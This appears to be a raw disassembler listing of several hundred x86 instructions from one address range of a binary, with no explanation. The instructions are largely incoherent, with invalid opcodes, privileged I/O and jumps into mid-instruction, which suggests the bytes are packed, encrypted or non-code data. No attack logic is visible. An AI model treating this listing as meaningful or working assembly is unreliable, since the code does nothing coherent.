  41f031:	dec    ebx
  41f032:	shl    DWORD PTR [esi],1
  41f034:	or     eax,0x4411e34
  41f039:	ret    
  41f03a:	or     BYTE PTR [esi],0x30
  41f03d:	adc    al,0xd3
  41f03f:	mov    eax,0x45e3e2db
  41f044:	sahf   
  41f045:	mov    dl,0x74
  41f047:	aad    0xd6
  41f049:	push   edx
  41f04a:	test   esi,0x8e75a604
  41f050:	xor    al,0x80
  41f052:	push   edx
  41f053:	imul   DWORD PTR [edx-0x3913630c]
  41f059:	jb     0x41f0d2
  41f05b:	icebp  
  41f05c:	pop    ebp
  41f05d:	jg     0x41f01c
  41f05f:	and    BYTE PTR [ebx-0x76],cl
  41f062:	daa    
  41f063:	inc    ebp
  41f064:	clc    
  41f065:	fucom  st(2)
  41f067:	mov    ecx,0x389dc4e9
  41f06c:	out    0x43,al
  41f06e:	mov    ss,WORD PTR ds:[eax-0x15bec18c]
  41f075:	shr    ch,0x6e
  41f078:	or     BYTE PTR [ebx],0xf1
  41f07b:	lods   eax,DWORD PTR ds:[esi]
  41f07c:	lahf   
  41f07d:	jnp    0x41f073
  41f07f:	loope  0x41f041
  41f081:	in     al,dx
  41f082:	mov    bh,0x13
  41f084:	out    dx,eax
  41f085:	sub    dl,BYTE PTR [esi-0x4c]
  41f088:	fcom   DWORD PTR [ecx]
  41f08a:	lods   eax,DWORD PTR ds:[esi]
  41f08b:	stos   DWORD PTR es:[edi],eax
  41f08c:	(bad)  
  41f08d:	scas   al,BYTE PTR es:[edi]
  41f08e:	es mov dl,0xc1
  41f091:	or     BYTE PTR [edx+0x78],cl
  41f094:	popf   
  41f095:	sub    dl,ah
  41f097:	fidivr DWORD PTR [ecx]
  41f099:	cli    
  41f09a:	mov    BYTE PTR [ecx+0x1bb55b55],bh
  41f0a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0a1:	pop    eax
  41f0a2:	jns    0x41f0b9
  41f0a4:	xchg   DWORD PTR [eax+0x70a5060],esp
  41f0aa:	imul   dh
  41f0ac:	loopne 0x41f10c
  41f0ae:	jne    0x41f0e5
  41f0b0:	push   ds
  41f0b1:	push   esi
  41f0b2:	lahf   
  41f0b3:	in     al,dx
  41f0b4:	sti    
  41f0b5:	scas   eax,DWORD PTR es:[edi]
  41f0b6:	sahf   
  41f0b7:	jbe    0x41f112
  41f0b9:	les    edi,FWORD PTR [ebx]
  41f0bb:	dec    eax
  41f0bc:	loop   0x41f0f8
  41f0be:	sub    esp,ebp
  41f0c0:	(bad)
  41f0c3:	and    eax,DWORD PTR [ebp+0x134428bb]
  41f0c9:	or     BYTE PTR [esi-0x48a2976d],ah
  41f0cf:	lds    esi,FWORD PTR [ebx+0x74]
  41f0d2:	sub    bh,BYTE PTR [esi]
  41f0d4:	icebp  
  41f0d5:	lock out dx,eax
  41f0d7:	push   edx
  41f0d8:	rcl    BYTE PTR [eax-0x54],0x54
  41f0dc:	lods   eax,DWORD PTR ds:[esi]
  41f0dd:	and    eax,0x8c3ff036
  41f0e2:	pushf  
  41f0e3:	pop    eax
  41f0e4:	mov    al,0x4c
  41f0e6:	sub    eax,0xac055396
  41f0eb:	out    0xbc,eax
  41f0ed:	fstp   TBYTE PTR [esp+ebx*8+0x54]
  41f0f1:	rcr    WORD PTR [edi],0xe3
  41f0f5:	pop    esi
  41f0f6:	mov    DWORD PTR [edx+0x7b],edi
  41f0f9:	and    ch,ah
  41f0fb:	(bad)  
  41f0fc:	rol    BYTE PTR [esi],0xab
  41f0ff:	nop
  41f100:	outs   dx,DWORD PTR ds:[esi]
  41f101:	mov    DWORD PTR [ebx-0x46],edi
  41f104:	mov    edi,DWORD PTR [ebp+0x7a0d4497]
  41f10a:	stc    
  41f10b:	push   ss
  41f10c:	jmp    0xa770:0x9c9e43f8
  41f113:	push   0xfffffffd
  41f115:	mov    al,0x1d
  41f117:	sar    DWORD PTR [ecx+0x2189733f],1
  41f11d:	mov    dl,0xc8
  41f11f:	in     al,0x83
  41f121:	jnp    0x2fb8de06
  41f127:	xor    BYTE PTR [edx-0x48],dl
  41f12a:	mov    esi,0xe5d35120
  41f12f:	sub    BYTE PTR [edi],dh
  41f131:	or     al,0xcd
  41f133:	shl    DWORD PTR [ecx],1
  41f135:	lds    edx,FWORD PTR [edx]
  41f137:	nop
  41f138:	push   ecx
  41f139:	sti    
  41f13a:	stos   DWORD PTR es:[edi],eax
  41f13b:	xchg   esi,eax
  41f13c:	add    ecx,DWORD PTR [ecx]
  41f13e:	scas   al,BYTE PTR es:[edi]
  41f13f:	das    
  41f140:	mov    BYTE PTR [edi],dh
  41f142:	inc    edi
  41f143:	mov    edx,DWORD PTR [eax-0x5887bb1]
  41f149:	sub    esp,DWORD PTR [ebx-0x1e]
  41f14c:	push   ds
  41f14d:	or     al,0xe6
  41f14f:	pop    es
  41f150:	shl    esp,0x33
  41f153:	mov    dl,0xf5
  41f155:	inc    eax
  41f156:	pushf  
  41f157:	ins    BYTE PTR es:[edi],dx
  41f158:	pop    edi
  41f159:	jg     0x41f189
  41f15b:	or     BYTE PTR [edi-0x2],bh
  41f15e:	rol    BYTE PTR [edi-0x65c8b5ce],1
  41f164:	jns    0x41f0f4
  41f166:	inc    edx
  41f167:	cwde   
  41f168:	jmp    0x5fc1:0x1b11ae9c
  41f16f:	cmp    BYTE PTR [ecx],0xe1
  41f172:	stos   DWORD PTR es:[edi],eax
  41f173:	cmp    dh,BYTE PTR [edx-0x59d87524]
  41f179:	dec    edi
  41f17a:	jmp    0xf4d9f1a1
  41f17f:	push   eax
  41f180:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f181:	mov    DWORD PTR [ecx-0x63],0xd59e8d87
  41f188:	imul   edi,DWORD PTR [eax],0x619caf54
  41f18e:	mov    cl,0x9d
  41f190:	cld    
  41f191:	pop    ds
  41f192:	shl    ch,0xfb
  41f195:	mov    eax,0x70eb2904
  41f19a:	mov    edi,0x66ab2b3c
  41f19f:	nop
  41f1a0:	test   al,0x76
  41f1a2:	(bad)  
  41f1a3:	cmc    
  41f1a4:	into   
  41f1a5:	mov    ebp,ebp
  41f1a7:	dec    ebx
  41f1a8:	repz push 0xfffffffe
  41f1ab:	loop   0x41f1b1
  41f1ad:	push   cs
  41f1ae:	sub    DWORD PTR [edi+0x2374f3bc],eax
  41f1b4:	stos   BYTE PTR es:[edi],al
  41f1b5:	pop    ebx
  41f1b6:	test   ebp,0x9dcb7779
  41f1bc:	sahf   
  41f1bd:	stos   BYTE PTR es:[edi],al
  41f1be:	lock push esp
  41f1c0:	push   0x9bb59a48
  41f1c5:	cmc    
  41f1c6:	lds    ebx,FWORD PTR [edx-0x6d]
  41f1c9:	mov    BYTE PTR [ecx+0x37],0x6
  41f1cd:	mov    dl,BYTE PTR [edi]
  41f1cf:	sub    al,0x6
  41f1d1:	cmp    edx,esp
  41f1d3:	sbb    cl,BYTE PTR [edi+0x6a2944d7]
  41f1d9:	pop    esp
  41f1da:	push   0xffffff85
  41f1dc:	mov    ch,BYTE PTR [esi]
  41f1de:	push   0x9b88a71
  41f1e3:	loopne 0x41f232
  41f1e5:	dec    esi
  41f1e6:	sub    DWORD PTR [ecx+ebx*8],ecx
  41f1e9:	sub    bl,BYTE PTR [edx]
  41f1eb:	jns    0x41f226
  41f1ed:	enter  0x6f9b,0xfb
  41f1f1:	pushf  
  41f1f2:	dec    edx
  41f1f3:	mov    ah,0x74
  41f1f5:	xor    DWORD PTR [ebx+edx*1-0x11],ebx
  41f1f9:	sub    eax,0xf93f5ff1
  41f1fe:	lds    ecx,FWORD PTR [ebp-0x70]
  41f201:	inc    ebp
  41f202:	hlt    
  41f203:	xor    al,0xf7
  41f205:	daa    
  41f206:	out    0xd3,al
  41f208:	jae    0x41f1f7
  41f20a:	jge    0x41f1dc
  41f20c:	dec    ecx
  41f20d:	adc    edx,DWORD PTR ds:0xd6b0d5de
  41f213:	xor    eax,0x8c9069f3
  41f218:	mov    ds:0xd95358d7,al
  41f21d:	lock dec esi
  41f21f:	call   0x3fffb5d0
  41f224:	and    BYTE PTR [edi+0x6e],cl
  41f227:	add    esi,DWORD PTR [ecx+0x2f0b93ed]
  41f22d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f22e:	test   DWORD PTR [edi],0xa25d2960
  41f234:	cmp    esp,ebp
  41f236:	aaa    
  41f237:	jne    0x41f24f
  41f239:	or     al,0x47
  41f23b:	sbb    al,BYTE PTR [ecx]
  41f23d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f23e:	cld    
  41f23f:	jmp    0x41f2a0
  41f241:	mov    eax,ds:0xc6efd210
  41f246:	mov    ecx,edx
  41f248:	mov    bl,0x6b
  41f24a:	or     eax,0x64dae812
  41f24f:	ret    
  41f250:	push   ebp
  41f251:	loopne 0x41f244
  41f253:	mov    bl,BYTE PTR [edx+0x430174b0]
  41f259:	in     al,0x75
  41f25b:	fist   DWORD PTR cs:[esi+0x70]
  41f25f:	mov    ah,BYTE PTR [ebp-0x77]
  41f262:	in     eax,dx
  41f263:	pop    ebp
  41f264:	jecxz  0x41f286
  41f266:	dec    ebp
  41f267:	mov    ecx,DWORD PTR [edx]
  41f269:	arpl   sp,sp
  41f26b:	jp     0x41f2cd
  41f26d:	xchg   DWORD PTR [ebx-0x238e5d5f],eax
  41f273:	xor    DWORD PTR [eax],ecx
  41f275:	cmp    dl,bh
  41f277:	popa   
  41f278:	lock inc eax
  41f27a:	pop    ebx
  41f27b:	xchg   esi,eax
  41f27c:	lods   al,BYTE PTR ds:[esi]
  41f27d:	xchg   esp,eax
  41f27e:	scas   al,BYTE PTR es:[edi]
  41f27f:	mov    esi,0x9923a923
  41f284:	jns    0x41f2cd
  41f286:	inc    ebx
  41f287:	jnp    0x41f2f3
  41f289:	stos   BYTE PTR es:[edi],al
  41f28a:	enter  0x3fca,0xe6
  41f28e:	push   ds
  41f28f:	mov    ebp,0x27b0cd23
  41f294:	test   eax,0x243a55a5
  41f299:	aam    0x5e
  41f29b:	loopne 0x41f23e
  41f29d:	mov    ecx,0x34cda992
  41f2a2:	adc    bl,BYTE PTR [eax-0x72]
  41f2a5:	imul   esp,ebx,0xb1dd7f23
  41f2ab:	xlat   BYTE PTR ds:[ebx]
  41f2ac:	das    
  41f2ad:	xor    al,0x94
  41f2af:	mov    ds:0x9d3d6b14,eax
  41f2b4:	xchg   edi,eax
  41f2b5:	sbb    eax,0x4cb98cf4
  41f2ba:	fstp   QWORD PTR [edi]
  41f2bc:	or     BYTE PTR [edi],al
  41f2be:	enter  0x79f9,0xc3
  41f2c2:	adc    dh,0x4b
  41f2c5:	inc    edi
  41f2c6:	add    eax,0x8fe29aff
  41f2cb:	push   0xffffffe2
  41f2cd:	dec    edi
  41f2ce:	in     al,dx
  41f2cf:	mov    ch,0x58
  41f2d1:	push   ss
  41f2d2:	ds cs mov ecx,0xe15076a4
  41f2d9:	stos   BYTE PTR es:[edi],al
  41f2da:	aaa    
  41f2db:	jmp    0x41f344
  41f2dd:	xor    ebp,ebx
  41f2df:	pushf  
  41f2e0:	repz adc al,0x58
  41f2e3:	cmp    eax,0xaec309cb
  41f2e8:	pop    esi
  41f2e9:	out    dx,al
  41f2ea:	icebp  
  41f2eb:	pusha  
  41f2ec:	shl    DWORD PTR [ecx+0x66],cl
  41f2ef:	inc    ebp
  41f2f0:	cmp    eax,0x71571aea
  41f2f5:	ficom  DWORD PTR [edi+0x5120b71a]
  41f2fb:	(bad)  
  41f2fc:	and    ch,bl
  41f2fe:	push   ebx
  41f2ff:	in     al,dx
  41f300:	push   edi
  41f301:	je     0x41f34b
  41f303:	and    DWORD PTR [eax-0x6],ecx
  41f306:	sub    esi,DWORD PTR [eax+0x6c]
  41f309:	out    0x59,al
  41f30b:	sub    BYTE PTR [edx-0x6e],bl
  41f30e:	cmp    bh,BYTE PTR [ebp+0x2c799414]
  41f314:	xor    cl,ch
  41f316:	aad    0x67
  41f318:	and    BYTE PTR [esi+0x42f7b924],bl
  41f31e:	jg     0x41f319
  41f320:	leave  
  41f321:	cmp    DWORD PTR [ebp-0x4b],ebx
  41f324:	mov    dh,0x41
  41f326:	rcl    DWORD PTR ds:0xd469f240,1
  41f32c:	ficomp DWORD PTR [edx]
  41f32e:	push   ss
  41f32f:	arpl   WORD PTR [edx+0x6094e1ed],dx
  41f335:	mov    ds,WORD PTR [eiz*1+0x5936bbb9]
  41f33c:	outs   dx,DWORD PTR ds:[esi]
  41f33d:	mov    esi,0x5541758b
  41f342:	xchg   BYTE PTR [ebx-0x14],dl
  41f345:	shl    BYTE PTR [eax-0x312f01fe],0x12
  41f34c:	xchg   ebp,eax
  41f34d:	rcl    BYTE PTR [eax+0x69],1
  41f350:	pushw  cs
  41f352:	mov    WORD PTR [ebx-0x78],fs
  41f355:	cdq    
  41f356:	xchg   ebx,eax
  41f357:	pop    esp
  41f358:	loop   0x41f3a8
  41f35a:	addr16 inc ecx
  41f35c:	jl     0x41f2ef
  41f35e:	dec    esi
  41f35f:	cmp    BYTE PTR [ecx-0x44067ff],0x6d
  41f366:	mov    BYTE PTR [esi-0x249e1dd5],bl
  41f36c:	mov    cl,ah
  41f36e:	push   cs
  41f36f:	and    eax,0x72c92e68
  41f374:	test   DWORD PTR [ebx-0x3e],ecx
  41f377:	xor    ebx,DWORD PTR ds:[ebp+ebx*2-0x4c]
  41f37c:	push   es
  41f37d:	sub    eax,0xcd5f4b3d
  41f382:	jl     0x41f3ce
  41f384:	dec    eax
  41f385:	call   ebx
  41f387:	xchg   ch,bl
  41f389:	add    DWORD PTR [esi],esp
  41f38b:	aam    0xd
  41f38d:	mov    WORD PTR fs:[di],ds
  41f391:	xor    ecx,ebx
  41f393:	push   ebp
  41f394:	(bad)  
  41f395:	out    0x60,al
  41f397:	retf   
  41f398:	icebp  
  41f399:	je     0x41f39b
  41f39b:	xor    DWORD PTR ds:0x67de010c,edi
  41f3a1:	cs jl  0x41f40d
  41f3a4:	mov    WORD PTR [edx+esi*4-0x71563fb],gs
  41f3ab:	fldenv [ecx]
  41f3ad:	add    DWORD PTR [ebp+ebx*8+0x2d],0xffffff83
  41f3b2:	mov    eax,0xddbc2398
  41f3b7:	shl    al,0x9e
  41f3ba:	in     eax,0xb5
  41f3bc:	push   edi
  41f3bd:	add    eax,0x5a86a1
  41f3c2:	pop    es
  41f3c3:	lahf   
  41f3c4:	dec    ebp
  41f3c5:	ret    
  41f3c6:	adc    esp,ebp
  41f3c8:	push   ebx
  41f3c9:	push   ebp
  41f3ca:	mov    ah,0xe0
  41f3cc:	not    edi
  41f3ce:	inc    edi
  41f3cf:	dec    edx
  41f3d0:	cli    
  41f3d1:	int    0x29
  41f3d3:	ret    
  41f3d4:	adc    bh,BYTE PTR [ebp+0x1a]
  41f3d7:	push   edi
  41f3d8:	xor    eax,0x90ddb29a
  41f3dd:	pusha  
  41f3de:	aam    0x23
  41f3e0:	mov    bh,0x7
  41f3e2:	xchg   ebp,eax
  41f3e3:	cmp    al,0xc0
  41f3e5:	push   eax
  41f3e6:	pushf  
  41f3e7:	xchg   esi,eax
  41f3e8:	jle    0x41f36f
  41f3ea:	adc    dh,al
  41f3ec:	ret    
  41f3ed:	mov    bh,0x67
  41f3ef:	test   DWORD PTR [eax-0x2c29d7c9],ebp
  41f3f5:	pop    ecx
  41f3f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3f7:	sub    dh,BYTE PTR [ebp-0x10e06345]
  41f3fd:	push   cs
  41f3fe:	and    eax,0x61d8339e
  41f403:	lds    ecx,FWORD PTR [ebx]
  41f405:	out    dx,al
  41f406:	jecxz  0x41f409
  41f408:	mov    ebp,DWORD PTR [ebp-0x7d]
  41f40b:	mov    ebp,0x1ac613b0
  41f410:	fstp   DWORD PTR ds:[eax+0x46]
  41f414:	pop    es
  41f415:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41f417:	xlat   BYTE PTR ds:[ebx]
  41f418:	retf   0xa603
  41f41b:	or     eax,0x1c12ab17
  41f420:	(bad)  
  41f421:	std    
  41f422:	sub    BYTE PTR [ecx-0x26814bc9],ah
  41f428:	sub    ecx,DWORD PTR [edx+0x36]
  41f42b:	ret    0x3161
  41f42e:	adc    BYTE PTR [edx+0x42],cl
  41f431:	cwde   
  41f432:	jmp    0x2ccc6ff6
  41f437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f438:	in     eax,0x5c
  41f43a:	(bad)  
  41f43b:	push   0x5bbc27dc
  41f440:	ins    BYTE PTR es:[edi],dx
  41f441:	shl    DWORD PTR [ebx],0xaf
  41f444:	sbb    al,BYTE PTR [eax]
  41f446:	add    BYTE PTR [eax],al
  41f448:	add    BYTE PTR [eax],al
  41f44a:	push   edx
  41f44b:	dec    ebp
  41f44c:	dec    esp
  41f44d:	inc    ebp
  41f44e:	pop    edi
  41f44f:	inc    ebp
  41f450:	pop    ebx
  41f451:	pop    edi
  41f452:	shr    BYTE PTR [esi+0x27],0x49
  41f456:	shl    BYTE PTR [esi],1
  41f458:	popf   
  41f459:	or     al,0xd3
  41f45b:	add    DWORD PTR [ecx],0x0
  41f45e:	add    DWORD PTR [esi],0x0
  41f461:	add    BYTE PTR [ebx+0x64d34ace],cl
  41f467:	mov    eax,ds:0x432ff1fe
  41f46c:	push   ds
  41f46d:	hlt    
  41f46e:	mov    ch,0x7d
  41f470:	push   ebx
  41f471:	jb     0x41f3f9
  41f473:	push   ebp
  41f474:	adc    al,0xee
  41f476:	cdq    
  41f477:	push   esi
  41f478:	pop    esi
  41f479:	sbb    dh,BYTE PTR [ebx-0x46]
  41f47c:	push   eax
  41f47d:	dec    esi
  41f47e:	jae    0x41f4bd
  41f480:	cli    
  41f481:	sub    eax,DWORD PTR [edi-0x7dda615e]
  41f487:	mov    ebx,0xa38ddc85
  41f48c:	lds    esp,FWORD PTR [ecx]
  41f48e:	sysexit 
  41f490:	push   esp
  41f491:	les    eax,FWORD PTR ds:0xc05b8077
  41f497:	and    eax,0xfe833653
  41f49c:	fmul   QWORD PTR [ecx-0x3f]
  41f49f:	ss jno 0x41f502
  41f4a2:	mov    eax,ds:0x9c2aee7f
  41f4a7:	cmp    bl,BYTE PTR [edi]
  41f4a9:	sbb    BYTE PTR [ebp-0x631ea622],0x29
  41f4b0:	in     eax,dx
  41f4b1:	outs   dx,BYTE PTR ds:[esi]
  41f4b2:	rcl    BYTE PTR [eax-0x6e73ef5],1
  41f4b8:	fcmove st,st(5)
  41f4ba:	add    DWORD PTR ds:0x32635b68,ebx
  41f4c0:	or     BYTE PTR [ebp+0x5c1a9aa2],al
  41f4c6:	loopne 0x41f49a
  41f4c8:	inc    esi
  41f4c9:	es add al,0xe2
  41f4cc:	test   ecx,edi
  41f4ce:	mov    edi,ebx
  41f4d0:	sub    BYTE PTR [eax+eax*1-0x5e],0xe5
  41f4d5:	or     eax,0xfcdf21ca
  41f4da:	out    0xa7,eax
  41f4dc:	xchg   ecx,eax
  41f4dd:	stos   BYTE PTR es:[edi],al
  41f4de:	add    al,0xfa
  41f4e0:	and    DWORD PTR ds:0x4b56ef59,0xffffffce
  41f4e7:	sbb    BYTE PTR [edi+ebp*2+0x34],ah
  41f4eb:	enter  0x17c6,0xcb
  41f4ef:	mov    BYTE PTR ss:[esp+edi*8],bh
  41f4f3:	int3   
  41f4f4:	int    0x76
  41f4f6:	out    dx,eax
  41f4f7:	sbb    al,0xda
  41f4f9:	or     DWORD PTR [ecx],esp
  41f4fb:	mov    ebx,0x43d43f87
  41f500:	div    BYTE PTR [ebp+0x10cd7f7e]
  41f506:	adc    BYTE PTR [edi],dl
  41f508:	cmp    eax,0x4adb1614
  41f50d:	and    bl,ah
  41f50f:	iret   
  41f510:	mov    WORD PTR fs:[edx+ebx*4],es
  41f514:	xchg   DWORD PTR [eax+0x6a],esp
  41f517:	test   al,0xc2
  41f519:	sti    
  41f51a:	sub    dl,BYTE PTR [esi+0x6b820079]
  41f520:	fadd   QWORD PTR [ebx]
  41f522:	cld    
  41f523:	cs jg  0x41f4ed
  41f526:	cwde   
  41f527:	pop    esp
  41f528:	test   al,0x56
  41f52a:	mov    DWORD PTR [eax-0x30258900],esp
  41f530:	inc    ebp
  41f531:	cld    
  41f532:	push   esp
  41f533:	iret   
  41f534:	sub    DWORD PTR [ebp+0x45],edx
  41f537:	push   edx
  41f538:	sbb    DWORD PTR [edi+eiz*8+0x7a],ebx
  41f53c:	inc    eax
  41f53d:	iret   
  41f53e:	mov    dh,0x8c
  41f540:	adc    edi,DWORD PTR [esi-0x2f827b6a]
  41f546:	test   al,0xd6
  41f548:	add    esi,0xffffff81
  41f54b:	fcomip st,st(3)
  41f54d:	adc    eax,0xe185165c
  41f552:	mov    ebp,0xa8c80c4b
  41f557:	outs   dx,DWORD PTR ds:[esi]
  41f558:	mov    ebp,0x13b30ce3
  41f55d:	mov    edx,0xcdd572e0
  41f562:	not    DWORD PTR [edi+eax*1+0x605fef6]
  41f569:	xchg   DWORD PTR [edi-0x53],ebx
  41f56c:	in     al,dx
  41f56d:	(bad)  
  41f56f:	adc    eax,0x65882446
  41f574:	fistp  DWORD PTR [edi-0x5f]
  41f577:	add    al,BYTE PTR [ebx+ebp*2+0x64e1babb]
  41f57e:	dec    eax
  41f57f:	cmp    al,0x92
  41f581:	mov    ds:0xf223cda4,al
  41f586:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41f588:	or     ebx,ecx
  41f58a:	pop    edi
  41f58b:	adc    esp,DWORD PTR [esi]
  41f58d:	jae    0x41f58e
  41f58f:	push   ss
  41f590:	dec    ebx
  41f591:	fild   DWORD PTR [ebx+eiz*4-0x7c]
  41f595:	aam    0xcc
  41f597:	or     esi,ebp
  41f599:	stos   BYTE PTR es:[edi],al
  41f59a:	push   esi
  41f59b:	and    DWORD PTR [ebp*1-0x43cc7de5],ecx
  41f5a2:	out    dx,al
  41f5a3:	xor    al,0xd0
  41f5a5:	js     0x41f604
  41f5a7:	jmp    0x797a504d
  41f5ac:	mov    dl,0x65
  41f5ae:	pop    es
  41f5af:	cmp    dh,bh
  41f5b1:	xchg   DWORD PTR [ecx],edx
  41f5b3:	mov    edi,0xf513c76b
  41f5b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5b9:	pop    ebp
  41f5ba:	aaa    
  41f5bb:	in     al,dx
  41f5bc:	sub    al,0x1d
  41f5be:	xor    eax,0xf62388e9
  41f5c3:	shl    BYTE PTR [ebp-0x17d75c91],1
  41f5c9:	dec    ebp
  41f5ca:	mov    ds:0x6823e598,al
  41f5cf:	pop    edi
  41f5d0:	bound  edi,QWORD PTR [ecx]
  41f5d2:	adc    BYTE PTR [esi],bl
  41f5d4:	sub    eax,0x5c673d6b
  41f5d9:	div    BYTE PTR [ebx+0x43]
  41f5dc:	jo     0x41f611
  41f5de:	fsincos 
  41f5e0:	sbb    BYTE PTR [ecx],ch
  41f5e2:	mov    ch,0x9f
  41f5e5:	xor    ah,ch
  41f5e7:	rcl    DWORD PTR [ebx+edi*8],1
  41f5ea:	repz jle 0x41f5cd
  41f5ed:	push   esi
  41f5ee:	dec    esi
  41f5ef:	push   esi
  41f5f0:	test   DWORD PTR [esi+0x36377f3b],edi
  41f5f6:	jle    0x41f623
  41f5f8:	imul   edi,DWORD PTR [ebp-0x528f943e],0xcf22f0cc
  41f602:	cli    
  41f603:	xor    ecx,ebp
  41f605:	and    DWORD PTR [edx-0x68e645e1],0x1ff7d59a
  41f60f:	outs   dx,DWORD PTR ds:[esi]
  41f610:	test   BYTE PTR [edx+esi*1+0x36],0x9
  41f615:	cli    
  41f616:	push   eax
  41f617:	mov    BYTE PTR [edi],dl
  41f619:	sub    DWORD PTR [ecx],edi
  41f61b:	lods   eax,DWORD PTR ds:[esi]
  41f61c:	test   eax,0x65f9b960
  41f621:	int    0x13
  41f623:	add    bl,BYTE PTR [eax+0x6c]
  41f626:	mov    al,ds:0xf0470bab
  41f62b:	sbb    DWORD PTR [edi+0x42960eed],ecx
  41f631:	add    al,0x2c
  41f633:	or     DWORD PTR [ecx],eax
  41f635:	pusha  
  41f636:	loop   0x41f609
  41f638:	or     BYTE PTR [eax],cl
  41f63a:	rcl    ah,0xc8
  41f63d:	std    
  41f63e:	xor    ebp,0x14
  41f641:	xchg   ebp,eax
  41f642:	clc    
  41f643:	add    bh,BYTE PTR [edx-0x4f036280]
  41f649:	xchg   edi,eax
  41f64a:	dec    ebp
  41f64b:	push   0x89c7f552
  41f650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f651:	in     eax,0xd
  41f653:	fsubr  DWORD PTR [ebp-0x4d668925]
  41f659:	cs je  0x41f65e
  41f65c:	(bad)  
  41f65d:	xchg   ebx,eax
  41f65e:	mov    dl,0xc0
  41f660:	mov    al,ds:0xd3e65717
  41f665:	cwde   
  41f666:	jle    0x41f6da
  41f668:	mov    BYTE PTR [ecx],al
  41f66a:	jns    0x41f604
  41f66c:	push   0x8
  41f66e:	push   cs
  41f66f:	sti    
  41f670:	xlat   BYTE PTR ds:[ebx]
  41f671:	fisubr DWORD PTR [ecx]
  41f673:	fstp   DWORD PTR [edi+0x45bfbaf8]
  41f679:	push   es
  41f67a:	lods   al,BYTE PTR ds:[esi]
  41f67b:	xlat   BYTE PTR ds:[ebx]
  41f67c:	out    dx,eax
  41f67d:	stos   BYTE PTR es:[edi],al
  41f67e:	lock fcmovnu st,st(3)
  41f681:	xor    ah,dl
  41f683:	pusha  
  41f684:	xchg   ebp,eax
  41f685:	dec    ebx
  41f686:	mov    esi,0xf69f5c2d
  41f68b:	fucomip st,st(6)
  41f68d:	or     esp,DWORD PTR [edi+0x5ec81373]
  41f693:	lahf   
  41f694:	scas   eax,DWORD PTR es:[edi]
  41f695:	mov    eax,ds:0x9948b553
  41f69a:	sub    al,0xb8
  41f69c:	stc    
  41f69d:	jle    0x41f694
  41f69f:	scas   al,BYTE PTR es:[edi]
  41f6a0:	xor    eax,0x740d51b6
  41f6a5:	(bad)  
  41f6a6:	cdq    
  41f6a7:	shr    DWORD PTR [esi],cl
  41f6a9:	and    ah,bh
  41f6ab:	inc    esp
  41f6ac:	sub    ecx,0xffffffac
  41f6af:	mov    WORD PTR [edi-0x12],?
  41f6b2:	cld    
  41f6b3:	sti    
  41f6b4:	test   DWORD PTR [esi+eax*8],eax
  41f6b7:	mov    ds:0x36b2c2a9,al
  41f6bc:	jb     0x41f659
  41f6be:	outs   dx,DWORD PTR ds:[esi]
  41f6bf:	imul   ebp,ebp,0xd4b13eff
  41f6c5:	lahf   
  41f6c6:	or     esi,DWORD PTR [edi-0x19]
  41f6c9:	sahf   
  41f6ca:	and    al,0x97
  41f6cc:	cmp    BYTE PTR [ebx-0x45],al
  41f6cf:	lea    ebx,[edx]
  41f6d1:	enter  0xdeae,0x21
  41f6d5:	adc    dl,BYTE PTR [edi+0x50]
  41f6d8:	mov    esi,0x5168dd37
  41f6dd:	out    dx,eax
  41f6de:	aaa    
  41f6df:	add    BYTE PTR [ebx+eax*2],bh
  41f6e2:	mov    ebx,0x85c434fc
  41f6e7:	pop    ss
  41f6e8:	pop    ecx
  41f6e9:	aad    0xdd
  41f6eb:	outs   dx,BYTE PTR ds:[esi]
  41f6ec:	adc    dl,BYTE PTR [ebp-0x43]
  41f6ef:	mov    WORD PTR [ebp+0x5f],gs
  41f6f2:	imul   esi,DWORD PTR [eax-0xf],0x45
  41f6f6:	pop    eax
  41f6f7:	pop    ebx
  41f6f8:	stos   DWORD PTR es:[edi],eax
  41f6f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6fa:	lahf   
  41f6fb:	mov    dl,0xd0
  41f6fd:	inc    esi
  41f6fe:	push   ss
  41f6ff:	cld    
  41f700:	jbe    0x41f6ce
  41f702:	jb     0x41f74c
  41f704:	outs   dx,BYTE PTR ds:[esi]
  41f705:	popf   
  41f706:	imul   BYTE PTR [esi+0x5877958c]
  41f70c:	adc    cl,BYTE PTR [ebx+eax*4+0x34]
  41f710:	inc    ebx
  41f711:	dec    ebx
  41f712:	mov    ch,0x12
  41f714:	push   esp
  41f715:	cdq    
  41f716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f717:	ror    BYTE PTR [ecx],cl
  41f719:	sbb    DWORD PTR [ecx-0x19e87af],eax
  41f71f:	xor    dl,ch
  41f721:	lock mov eax,0x32ff9243
  41f727:	mov    gs,WORD PTR [ebx-0x5d]
  41f72a:	data16 xlat BYTE PTR fs:[ebx]
  41f72d:	and    bh,dl
  41f72f:	dec    DWORD PTR [ebp+0x2de3240f]
  41f735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f736:	je     0x41f75b
  41f738:	pop    edi
  41f739:	nop
  41f73a:	jne    0x41f7b7
  41f73c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f73d:	push   ds
  41f73e:	and    cl,BYTE PTR [edi]
  41f740:	mov    dh,0xf8
  41f742:	and    bl,dh
  41f744:	pop    ds
  41f745:	repz inc eax
  41f748:	fdiv   st,st(5)
  41f74a:	mov    cl,BYTE PTR [ecx]
  41f74c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f74d:	jl     0x41f787
  41f74f:	add    ebx,ebp
  41f751:	cmp    DWORD PTR [esi],eax
  41f753:	retf   
  41f754:	cmp    eax,ecx
  41f756:	jecxz  0x41f742
  41f758:	arpl   sp,dx
  41f75a:	jbe    0x41f7c7
  41f75c:	in     eax,0xf4
  41f75e:	lods   al,BYTE PTR ds:[esi]
  41f75f:	xchg   ecx,eax
  41f760:	jmp    0x74e8:0x3f50c51f
  41f767:	cmp    al,0xa8
